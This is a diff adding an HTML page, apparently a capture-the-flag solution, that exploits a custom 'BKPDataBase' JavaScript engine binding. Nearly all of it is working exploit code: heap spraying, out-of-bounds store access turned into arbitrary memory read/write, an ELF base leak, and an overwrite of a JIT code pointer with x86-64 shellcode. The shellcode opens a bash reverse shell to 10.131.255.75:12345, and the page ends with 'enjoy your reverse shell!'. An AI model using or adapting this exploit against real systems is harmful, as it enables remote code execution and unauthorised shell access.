@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<!--
+dbinstance db;
+db.createStore
+  xx = new BKPStore(..)
+  db.storemap insert xx
+  return xx
+BKPStore constructor
+
+-->
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Solve</title>
+  </head>
+  <body>
+    <div id="out">
+
+    </div>
+  </body>
+<script language="javascript" charset="utf-8" type="text/javascript">
+
+//shellcode = "j9X\x0f\x05H\x83\xf8\x00t\x08\xeb~XH\x8b\x00\xff\xe0H\xc7\xc0p\x00\x00\x00\x0f\x05j\x00H\x8d\x053\x00\x00\x00PH\x8d\x05(\x00\x00\x00PH\x8d\x05\x18\x00\x00\x00PH\x8b<$H\x89\xe6H\xc7\xc2\x00\x00\x00\x00H\xc7\xc0;\x00\x00\x00\x0f\x05/bin/sh\x00-c\x00bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'\x00\xe8}\xff\xff\xff";
+//shellcode = "j9X\x0f\x05H\x83\xf8\x00t\x0b\xe9\x82\x00\x00\x00XH\x8b\x00\xff\xe0H\xc7\xc0p\x00\x00\x00\x0f\x05j\x00H\x8d\x053\x00\x00\x00PH\x8d\x05(\x00\x00\x00PH\x8d\x05\x18\x00\x00\x00PH\x8b<$H\x89\xe6H\xc7\xc2\x00\x00\x00\x00H\xc7\xc0;\x00\x00\x00\x0f\x05/bin/sh\x00-c\x00bash -c 'bash -i >& /dev/tcp/10.131.255.75/12345 0<&1'\x00\xe8y\xff\xff\xff";
+shellcode = "j9X\x0f\x05H\x83\xf8\x00t\x0b\xe9\x9d\x00\x00\x00XH\x8b\x00\xff\xe0H\xc7\xc0p\x00\x00\x00\x0f\x05j\x00H\x8d\x053\x00\x00\x00PH\x8d\x05(\x00\x00\x00PH\x8d\x05\x18\x00\x00\x00PH\x8b<$H\x89\xe6H\xc7\xc2\x00\x00\x00\x00H\xc7\xc0;\x00\x00\x00\x0f\x05/bin/sh\x00-c\x00                          bash -c 'bash -i >& /dev/tcp/10.131.255.75/12345 0<&1';\x00\xe8^\xff\xff\xff";
+//shellcode = "j9X\x0f\x05H\x83\xf8\x00t\x0c\xc3\xe9\x82\x00\x00\x00XH\x8b\x00\xff\xe0H\xc7\xc0p\x00\x00\x00\x0f\x05j\x00H\x8d\x053\x00\x00\x00PH\x8d\x05(\x00\x00\x00PH\x8d\x05\x18\x00\x00\x00PH\x8b<$H\x89\xe6H\xc7\xc2\x00\x00\x00\x00H\xc7\xc0;\x00\x00\x00\x0f\x05/bin/sh\x00-c\x00bash -c 'bash -i >& /dev/tcp/10.131.255.75/12345 0<&1'\x00\xe8y\xff\xff\xff";
+
+function print(x) {
+  var out = document.getElementById("out").innerHTML;
+  out += x.toString() + "<br />";
+  document.getElementById("out").innerHTML = out;
+}
+
+function p64(x) {
+  var ret = "";
+  for (var i = 0; i < 8; ++i) {
+    ret += String.fromCharCode(x%256);
+    x /= 256;
+  }
+  return ret;
+}
+
+function jitfunc(a, b, c) {
+  var ret = a;
+  for(var i = 0; i < 1000000; ++i) {
+    ret = ret ^ 0x123456789 ^ 0xaaaaaa ^ 0xbbbbbb ^ 0xccccccc;
+  }
+  return ret;
+}
+jitfunc(1,2,3);
+jitfunc(1,2,3);
+var T = new Array(10000);
+var pp = "AAAA";
+for (var i = 0; i < 10000; ++i) {
+  var t = new Array(50);
+  for (var j = 0; j < 97; j+=3) {
+    t[j] = pp;
+    t[j+1] = pp;
+    t[j+2] = jitfunc;
+  }
+  T[i] = t;
+}
+
+
+
+var db = BKPDataBase.create("mydb", "mypassword");
+while (1) {
+  var p1 = Math.floor(Math.random()*1e12);
+  var p2 = Math.floor(Math.random()*1e12);
+  var p3 = Math.floor(Math.random()*1e12);
+
+  var xx = db.createStore("xx", 1, [0,1,2,3,4,5,0xdeadbeef], 0);
+  var a = db.createStore("a", 1, [0,0xaaaa0,p3,0xaaaa1,4,5,0xdeadbeef], 0);
+  var b = db.createStore("b", 1, [0xbbbb0,p2,0xbbbb1,3,4,5,0xdeadbeef], p1);
+  var a2bping_index = -1;
+  var a2bvec_index = -1;
+  var xx2avec_index = -1;
+
+  a.remove(-1);
+  a.insert(0, 0xfffff00000001);
+  xx.remove(-1);
+  xx.insert(0, 0xfffff00000001);
+
+  for (var i = 0; i < 1000; ++i) {
+    if (a.get(i) == p1 && a.get(i-1) == a.get(i-3)) {
+      a2bping_index = i;
+      break;
+    }
+  }
+
+  for (var i = 0; i < 1000; ++i) {
+    if (a.get(i) == 0xbbbb0 && a.get(i+1) == p2 && a.get(i+2) == 0xbbbb1) {
+      a2bvec_index = i;
+      break;
+    }
+  }
+
+  for (var i = 0; i < 1000; ++i) {
+    if (xx.get(i) == 0xaaaa0 && xx.get(i+1) == p3 && xx.get(i+2) == 0xaaaa1) {
+      xx2avec_index = i-1;
+      break;
+    }
+  }
+
+  if (a2bping_index != -1 && a2bvec_index != -1 && xx2avec_index != -1) {
+    break;
+  }
+}
+
+print("a2bping_index " + a2bping_index);
+print("a2bvec_index " + a2bvec_index);
+print("xx2avec_index " + xx2avec_index);
+
+var bvec_addr = a.get(a2bping_index-2)
+var avec_addr = bvec_addr+0x18-a2bvec_index*8;
+var bping_addr = avec_addr + a2bping_index*8;
+
+print("b.intvect " + bvec_addr.toString(16));
+print("a.intvect " + avec_addr.toString(16));
+print("b.ping " + bping_addr.toString(16));
+
+function read(addr) {
+  xx.insert(xx2avec_index, addr - avec_addr);
+  var ret = a.get(0);
+  xx.insert(xx2avec_index, 0);
+  return ret;
+}
+
+function write(addr, v) {
+  xx.insert(xx2avec_index, addr - avec_addr);
+  a.insert(0, v);
+  xx.insert(xx2avec_index, 0);
+}
+var vtable = read(bping_addr-0x30);
+var elf = vtable - 0x210400;
+print("elf base " + elf.toString(16));
+
+//print(read(avec_addr).toString(16));
+
+var func_addr = 0;
+var strptr = 0;
+
+
+for (var jimbo = avec_addr;func_addr == 0;jimbo-=8) {
+  // check chunk is valid
+  chunksz = read(jimbo);
+  if (chunksz < 0x20 || (chunksz & 0xf1) != chunksz)
+    continue;
+  chunksz -= chunksz & 1;
+  nextsz = read(jimbo+chunksz);
+  if (nextsz < 0x20 || (nextsz & 0xfff1) != nextsz || (nextsz&1)!=1)
+    continue;
+
+  // page aligned addresses?
+  heapaddr = read(jimbo+10*8);
+  if ((heapaddr <= avec_addr) || ((heapaddr & 0xfff) != 0))
+    continue;
+  if (heapaddr != read(jimbo + 11*8))
+    continue;
+
+  /* matches JS heap caracs? */
+  nbregions = read(jimbo+2*8);
+  regsz = read(jimbo+4*8);
+  heapsz = read(jimbo + 12*8);
+  if (nbregions != 2 || ((heapsz & 0xfff) != 0) || ((regsz & 0xfff) != 0) || heapsz == 0 || nbregions*regsz != heapsz)
+    continue;
+  for (var i = 0; i < 200; ++i) {
+    var bb = heapaddr + i*8;
+    var check = 1;
+    for (var j = 0; j < 10 ; ++j) {
+      if (read(bb+j*8) != read(bb+j*8+24)){ 
+        check = 0;
+        break;
+      }
+    }
+    if (check && (read(bb)==read(bb+8) && read(bb) != read(bb+16))) {
+      strptr = read(bb);
+      func_addr = read(bb+16);
+    }
+  }
+}
+
+print("func_addr " + func_addr.toString(16));
+var ptr2jitptr = read(func_addr+0x18)+0x20;
+print("ptr2jitptr " + ptr2jitptr.toString(16));
+var jitptr = read(ptr2jitptr);
+print("jitpr " + jitptr.toString(16));
+
+scptr = jitptr + 0x1000;
+print("scptr " + scptr.toString(16));
+
+shellcode += p64(jitptr);
+print("shellcode " + shellcode);
+
+for (var i = 0; i < shellcode.length; ++i) {
+  //write(scptr+i, shellcode.charCodeAt(i));
+  write(scptr+i, shellcode.charCodeAt(i));
+}
+write(ptr2jitptr, scptr);
+
+
+jitfunc(1,2,3);
+
+
+print("no stucking, no poping, no flashing XD");
+print("enjoy your reverse shell!");
+
+</script>
+</html>
